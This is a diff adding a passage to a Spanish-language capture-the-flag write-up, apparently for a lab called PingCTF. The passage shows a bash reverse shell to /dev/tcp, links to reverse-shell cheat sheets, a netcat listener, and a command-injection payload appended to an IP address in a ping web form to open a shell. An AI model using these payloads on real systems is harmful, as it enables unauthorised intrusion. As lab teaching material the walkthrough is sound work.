@@ -82,5 +82,32 @@ Y parece que da resultado:
 
 ![Nmap Scan](images/PingCTF/7.png)
 
+Vamos a crear una reverse shell y enviarla; en mi caso ejecuto este comando:
 
+```bash
+bash -c "bash -i >& /dev/tcp/<TU IP>/<PUERTO EN ESCUCHA> 0>&1"
+```
+
+podeis encontrar las reverse shell en:
+
+```bash
+https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+https://www.revshells.com/
+```
+
+nos ponemos en nuestra máquina kali a la escucha por el puerto 445:
+
+```bash
+sudo nc -lvnp 445
+```
+
+e introducimos y ejecutamos en la página web:
+
+```bash
+127.0.0.1;bash -c "bash -i >& /dev/tcp/172.17.0.1/445 0>&1"
+```
+
+Y estamos dentro
+
+![Nmap Scan](images/PingCTF/9.png)
 
